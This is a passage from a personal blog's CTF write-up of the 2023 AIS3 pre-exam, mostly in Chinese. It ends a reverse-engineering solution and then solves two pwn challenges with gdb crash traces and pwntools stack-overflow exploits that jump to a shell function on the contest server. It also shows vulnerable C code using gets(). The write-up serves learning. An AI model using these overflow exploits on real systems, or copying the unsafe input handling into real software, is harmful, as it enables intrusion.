class="number">112</span>,<span class="number">156</span>,<span class="number">145</span>,<span class="number">102</span>,<span class="number">101</span>,<span class="number">56</span>,<span class="number">136</span>,<span class="number">42</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">129</span>,<span class="number">107</span>,<span class="number">198</span>,<span class="number">105</span>,<span class="number">242</span>,<span class="number">30</span>,<span class="number">25</span>,<span class="number">12</span>,<span class="number">23</span>,<span class="number">102</span>,<span class="number">16</span>,<span class="number">157</span>,<span class="number">93</span>,<span class="number">130</span>,<span class="number">101</span>,<span class="number">44</span>,<span class="number">235</span>,<span class="number">91</span>,<span class="number">164</span>,<span class="number">133</span>,<span class="number">33</span>,<span class="number">59</span>,<span class="number">75</span>,<span class="number">164</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">177</span>,<span class="number">191</span>,<span class="number">231</span>,<span class="number">142</span>,<span class="number">253</span>,<span class="number">117</span>,<span class="number">194</span>,<span class="number">134</span>,<span class="number">203</span>,<span class="number">185</span>,<span class="number">200</span>,<span class="number">114</span>,<span class="number">10</span>,<span class="number">147</span>,<span class="number">111</span>,<span class="number">122</span>,<span class="number">65</span>,<span class="number">208</span>,<span class="number">208</span>,<span class="number">232</span>,<span class="number">21</span>,<span class="number">101</span>,<span class="number">18</span>,<span class="number">42</span>,<span class="number">16</span>,<span class="number">40</span>,<span class="number">192</span>,<span class="number">73</span>,<span class="number">156</span>,<span class="number">127</span>,<span class="number">154</span>,<span class="number">117</span>,<span class="number">237</span>,<span class="number">211</span>,<span class="number">209</span>,<span class="number">221</span>,<span class="number">188</span>,<span class="number">238</span>,<span class="number">44</span>,<span class="number">60</span>,<span class="number">117</span>,<span class="number">242</span>,<span class="number">178</span>,<span class="number">111</span>,<span class="number">107</span>,<span class="number">174</span>,<span class="number">196</span>,<span class="number">33</span>,<span class="number">141</span>,<span class="number">42</span>,<span class="number">190</span>,<span class="number">73</span>,<span class="number">239</span>,<span class="number">9</span>,<span class="number">17</span>,<span class="number">249</span>,<span class="number">80</span>,<span class="number">97</span>,<span class="number">58</span>,<span class="number">235</span>,<span class="number">156</span>,<span class="number">178</span>,<span class="number">49</span>,<span class="number">218</span>,<span class="number">205</span>,<span class="number">46</span>,<span class="number">137</span>,<span class="number">76</span>,<span class="number">106</span>,<span class="number">31</span>,<span class="number">234</span>,<span class="number">233</span>,<span class="number">229</span>,<span class="number">173</span>,<span class="number">111</span>,<span class="number">217</span>,<span class="number">192</span>,<span class="number">242</span>,<span class="number">43</span>,<span class="number">68</span>,<span class="number">126</span>,<span class="number">243</span>,<span class="number">157</span>,<span class="number">36</span>,<span class="number">54</span>,<span class="number">187</span>&#125;;</span><br><span class="line"><span class="type">int</span> f[<span class="number">335</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">IOS</span></span><br><span class="line"><span class="function">    <span class="title">for</span><span class="params">(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">333</span>;i++)</span></span>&#123;</span><br><span class="line">        f[ind[i]]=val[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">333</span>;i++)&#123;</span><br><span class="line">        cout&lt;&lt;f[i]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ans.txt</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ python3 flag-decryptor.py</span><br><span class="line">Welcome to the flag decryptor! (｡･ω･｡)ﾉ♡</span><br><span class="line">Please make a file to store your all answers (in integers).</span><br><span class="line">Make sure there is not endline at the end.</span><br><span class="line">The file is has to follow the format below:</span><br><span class="line">&lt;answer[0]&gt;</span><br><span class="line">&lt;answer[1]&gt;</span><br><span class="line">&lt;answer[2]&gt;</span><br><span class="line">...</span><br><span class="line">&lt;answer[N]&gt;</span><br><span class="line">Here is an example that satisfies the format:</span><br><span class="line">251</span><br><span class="line">5</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">...</span><br><span class="line">63</span><br><span class="line">Please enter the file path of answer: ans.txt</span><br><span class="line">[*] Derived Key (May not able to decrypt): 5d3242c61ffecc64bfc37f255b827ef239b6dc7c5b030458be40a1979cba2bf1</span><br><span class="line">[+] Congrats （＊´・∀・＊）! Here is your flag: AIS3&#123;OuO_Hope_th1s_ch4l1eng3_gIve_y0u_viv1d_em0Tions!_(ฅ^･ω･^ ฅ)&#125;!</span><br></pre></td></tr></table></figure>

<p>FLAG: <code>AIS3&#123;OuO_Hope_th1s_ch4l1eng3_gIve_y0u_viv1d_em0Tions!_(ฅ^･ω･^ ฅ)&#125;</code></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Simply-Pwn-356"><a href="#Simply-Pwn-356" class="headerlink" title="Simply Pwn [356]"></a>Simply Pwn [356]</h2><div class="note default flat"><p>The simplest pwn</p>
<p><code>nc chals1.ais3.org 11111</code></p>
</div>
<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1XQctYAM-Ul1LKooX8ofRM51pX6P1vIQI/view?usp=sharing">https://drive.google.com/file/d/1XQctYAM-Ul1LKooX8ofRM51pX6P1vIQI/view?usp=sharing</a></p>
</blockquote>
<p><img src="https://imgur.com/nHtWsbi.png"></p>
<p>這題很明顯是buffer overflow，因為<code>read</code>的bytes數量(256 bytes)超過了儲存量，且有一個<code>shellcode function</code>可以執行<code>/bin/sh</code>，所以要讓<code>rsp</code>指向他讓他跳上去。把elf跑起來之後發現過了67個bytes之後會出現一個亂碼，表示最多的儲存陣列就到67 bytes，所以接下來再蓋12 bytes把<code>old rbp</code>蓋掉就可以跳到<code>shellcode</code>上面了，所以一共要蓋$67+12=79$ bytes。直接寫exploit就可以拿到shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">Show me your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;chals1.ais3.org&#x27;</span>,<span class="number">11111</span>)</span><br><span class="line"></span><br><span class="line">s=<span class="number">0x4017a5</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">79</span>+p64(s))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>FLAG: <code>AIS3&#123;5imP1e_Pwn_4_beGinn3rs!&#125;</code></p>
<h2 id="ManagementSystem-443"><a href="#ManagementSystem-443" class="headerlink" title="ManagementSystem [443]"></a>ManagementSystem [443]</h2><div class="note default flat"><p>這個系統，看起來好像有點問題…。請利用你的技能和知識，找到漏洞並利用它們吧！</p>
<p>flag format : <code>FLAG{xxx}</code></p>
<p>Author : Richard ( dogxxx)</p>
<p><code>nc chals1.ais3.org 10003</code></p>
</div>
<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1mnng4xunujuw5jCK1udhEmD5fTFkdbdi/view?usp=sharing">https://drive.google.com/file/d/1mnng4xunujuw5jCK1udhEmD5fTFkdbdi/view?usp=sharing</a></p>
</blockquote>
<p>這題其實跟第一題很像，可以發現在<code>delete</code>的function裡面出現了一個<code>gets()</code>誤用的buffer overflow，也有<code>secret_function</code>可以開shell，不過這個<code>delete</code> function要在database裡存在<code>user</code>時才能使用，因此前面要先註冊一個<code>user</code>，接下來才繼續執行<code>delete</code> function。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">User *<span class="title function_">delete_user</span><span class="params">(User *head)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the index of the user you want to delete: &quot;</span>);</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    gets(buffer); </span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> user_index;</span><br><span class="line">    <span class="built_in">sscanf</span>(buffer, <span class="string">&quot;%d&quot;</span>, &amp;user_index);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user_index &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid index.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user_index == <span class="number">1</span>) &#123;</span><br><span class="line">        User *user_to_delete = head;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(user_to_delete);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    User *previous = head;</span><br><span class="line">    User *current = head-&gt;next;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == user_index) &#123;</span><br><span class="line">            previous-&gt;next = current-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(current);</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        previous = current;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;User not found.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>sscanf</code>會將buffer裡面的數字部分存到<code>user_index</code>，為了要執行到<code>ret</code>，因此我們要先給定一個假數字後接上空白，之後再接上payload，這樣可以讓<code>user_index</code>的檢查正常執行，最終跳到<code>secret_function</code>上面。</p>
<p>至於要蓋掉多少，可以用gdb來看看。用gef <code>pattern create</code>之後，根據前面的指示，最後在delete user的地方塞入<code>b&#39;123 &#39;</code>+pattern，可以發現<code>rsp</code>指向了<code>aaaanaaaaaaaoaaaaaaa</code>，gef顯示<code>pattern search</code>的offset是100，所以要塞入的pattern量就是100 bytes，直接寫個exploit就可以拿到shell了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">gef➤</span><br><span class="line">Enter the index of the user you want to delete: 123 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaa</span><br><span class="line">User not found.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x0000000000401660 in delete_user ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x000000004052a0  →  0x00000000333231 (&quot;123&quot;?)</span><br><span class="line">$rbx   : 0x000000004017b0  →  &lt;__libc_csu_init+0&gt; endbr64</span><br><span class="line">$rcx   : 0x007ffff7ed1077  →  0x5177fffff0003d48 (&quot;H=&quot;?)</span><br><span class="line">$rdx   : 0x0</span><br><span class="line">$rsp   : 0x007fffffffe058  →  &quot;aaaanaaaaaaaoaaaaaaa&quot;</span><br><span class="line">$rbp   : 0x6161616d61616161 (&quot;aaaamaaa&quot;?)</span><br><span class="line">$rsi   : 0x007ffff7fb0723  →  0xfb17e0000000000a (&quot;\n&quot;?)</span><br><span class="line">$rdi   : 0x007ffff7fb17e0  →  0x0000000000000000</span><br><span class="line">$rip   : 0x00000000401660  →  &lt;delete_user+271&gt; ret</span><br><span class="line">$r8    : 0x10</span><br><span class="line">$r9    : 0x0</span><br><span class="line">$r10   : 0x007ffff7f5eac0  →  0x0000000100000000</span><br><span class="line">$r11   : 0x246</span><br><span class="line">$r12   : 0x000000004011d0  →  &lt;_start+0&gt; endbr64</span><br><span class="line">$r13   : 0x007fffffffe170  →  0x0000000000000001</span><br><span class="line">$r14   : 0x0</span><br><span class="line">$r15   : 0x0</span><br><span class="line">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class="line">$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x007fffffffe058│+0x0000: &quot;aaaanaaaaaaaoaaaaaaa&quot;         ← $rsp</span><br><span class="line">0x007fffffffe060│+0x0008: &quot;aaaaoaaaaaaa&quot;</span><br><span class="line">0x007fffffffe068│+0x0010: 0x00000061616161 (&quot;aaaa&quot;?)</span><br><span class="line">0x007fffffffe070│+0x0018: 0x007fffffffe170  →  0x0000000000000001</span><br><span class="line">0x007fffffffe078│+0x0020: 0x000000004052a0  →  0x00000000333231 (&quot;123&quot;?)</span><br><span class="line">0x007fffffffe080│+0x0028: 0x0000000000000000</span><br><span class="line">0x007fffffffe088│+0x0030: 0x007ffff7de7083  →  &lt;__libc_start_main+243&gt; mov edi, eax</span><br><span class="line">0x007fffffffe090│+0x0038: 0x007ffff7ffc620  →  0x00050a6600000000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">     0x401656 &lt;delete_user+261&gt; call   0x401110 &lt;puts@plt&gt;</span><br><span class="line">     0x40165b &lt;delete_user+266&gt; mov    rax, QWORD PTR [rbp-0x78]</span><br><span class="line">     0x40165f &lt;delete_user+270&gt; leave</span><br><span class="line"> →   0x401660 &lt;delete_user+271&gt; ret</span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;ms&quot;, stopped 0x401660 in delete_user (), reason: SIGSEGV</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x401660 → delete_user()</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  pattern search aaaanaaaaaaaoaaaaaaa</span><br><span class="line">[+] Searching for &#x27;aaaanaaaaaaaoaaaaaaa&#x27;</span><br><span class="line">[+] Found at offset 100 (big-endian search)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;chals1.ais3.org&#x27;</span>,<span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">s=<span class="number">0x40131b</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;123&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;123&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;123&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;100 &#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">100</span>+p64(s))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>FLAG: <code>FLAG&#123;C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!&#125;</code></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:alb105322129@gmail.com">Albert Huang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://albert-notes.github.io/2023/05/27/AIS3-2023-preexam/">http://albert-notes.github.io/2023/05/27/AIS3-2023-preexam/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/AIS3/">AIS3</a><a class="post-meta__tags" href="/tags/Security/">Security</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2023/03/30/picoctf-2023/"><img class="prev-cover" src="/img/picoctf.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">picoCTF 2023 Write Up</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/06/11/AIS3-2022-preexam/" title="2022 AIS3 Pre-exam Write Up"><img class="cover" src="/img/ais2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-11</div><div class="title">2022 AIS3 Pre-exam Write Up</div></div></a></div><div><a href="/2021/06/06/AIS3-2021-preexam/" title="2021 AIS3 Pre-exam Write Up"><img class="cover" src="/img/ais.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-06</div><div class="title">2021 AIS3 Pre-exam Write Up</div></div></a></div><div><a href="/2021/06/06/myfirstctf-2021/" title="2021 MyFirstCTF Write Up"><img class="cover" src="/img/mfc.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-06</div><div class="title">2021 MyFirstCTF Write Up</div></div></a></div><div><a href="/2023/03/30/picoctf-2023/" title="picoCTF 2023 Write Up"><img class="cover" src="/img/picoctf.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-30</div><div class="title">picoCTF 2023 Write Up</div></div></a></div><div><a href="/2023/01/30/ctf-reverse-1/" title="CTF系列-Reverse Engineering逆向工程基礎I"><img class="cover" src="/img/mlw.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-30</div><div class="title">CTF系列-Reverse Engineering逆向工程基礎I</div></div></a></div><div><a href="/2023/01/28/ctf-crypto-2/" title="CTF系列-Cryptography密碼學進階I"><img class="cover" src="/img/cgy.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-28</div><div class="title">CTF系列-Cryptography密碼學進階I</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/alb.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Albert Huang</div><div class="author-info__description">Decide your own life.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">22</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/albert-notes"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/albert-notes" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:alb105322129@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://www.facebook.com/albert.huang.57/" target="_blank" title="Facebook"><i class="fab fa-facebook"></i></a><a class="social-icon" href="https://www.instagram.com/albert.huang_57/" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">《拓》 2022 全國高中生大合唱出爐囉 ! 趕快去 Music 分頁點播 !</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Welcome-100"><span class="toc-number">1.1.</span> <span class="toc-text">Welcome [100]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Robot-100"><span class="toc-number">1.2.</span> <span class="toc-text">Robot [100]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Login-Panel-100"><span class="toc-number">2.1.</span> <span class="toc-text">Login Panel [100]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fernet-100"><span class="toc-number">3.1.</span> <span class="toc-text">Fernet [100]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2DES-484"><span class="toc-number">3.2.</span> <span class="toc-text">2DES [484]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSB-Oracle-Attack-499"><span class="toc-number">3.3.</span> <span class="toc-text">MSB Oracle Attack [499]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Simply-Reverse-139"><span class="toc-number">4.1.</span> <span class="toc-text">Simply Reverse [139]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag-Sleeper-379"><span class="toc-number">4.2.</span> <span class="toc-text">Flag Sleeper [379]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vivid-Emotion-493"><span class="toc-number">4.3.</span> <span class="toc-text">Vivid Emotion [493]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Simply-Pwn-356"><span class="toc-number">5.1.</span> <span class="toc-text">Simply Pwn [356]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ManagementSystem-443"><span class="toc-number">5.2.</span> <span class="toc-text">ManagementSystem [443]</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/05/27/AIS3-2023-preexam/" title="2023 AIS3 Pre-exam Write Up"><img src="/img/ais4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2023 AIS3 Pre-exam Write Up"/></a><div class="content"><a class="title" href="/2023/05/27/AIS3-2023-preexam/" title="2023 AIS3 Pre-exam Write Up">2023 AIS3 Pre-exam Write Up</a><time datetime="2023-05-27T14:49:43.000Z" title="Created 2023-05-27 22:49:43">2023-05-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/30/picoctf-2023/" title="picoCTF 2023 Write Up"><img src="/img/picoctf.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="picoCTF 2023 Write Up"/></a><div class="content"><a class="title" href="/2023/03/30/picoctf-2023/" title="picoCTF 2023 Write Up">picoCTF 2023 Write Up</a><time datetime="2023-03-30T10:09:42.000Z" title="Created 2023-03-30 18:09:42">2023-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/30/ctf-reverse-1/" title="CTF系列-Reverse Engineering逆向工程基礎I"><img src="/img/mlw.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF系列-Reverse Engineering逆向工程基礎I"/></a><div class="content"><a class="title" href="/2023/01/30/ctf-reverse-1/" title="CTF系列-Reverse Engineering逆向工程基礎I">CTF系列-Reverse Engineering逆向工程基礎I</a><time datetime="2023-01-30T05:44:27.000Z" title="Created 2023-01-30 13:44:27">2023-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/28/ctf-crypto-2/" title="CTF系列-Cryptography密碼學進階I"><img src="/img/cgy.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF系列-Cryptography密碼學進階I"/></a><div class="content"><a class="title" href="/2023/01/28/ctf-crypto-2/" title="CTF系列-Cryptography密碼學進階I">CTF系列-Cryptography密碼學進階I</a><time datetime="2023-01-28T13:41:20.000Z" title="Created 2023-01-28 21:41:20">2023-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/26/ctf-crypto-1/" title="CTF系列-Cryptography密碼學基礎"><img src="/img/enc.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF系列-Cryptography密碼學基礎"/></a><div 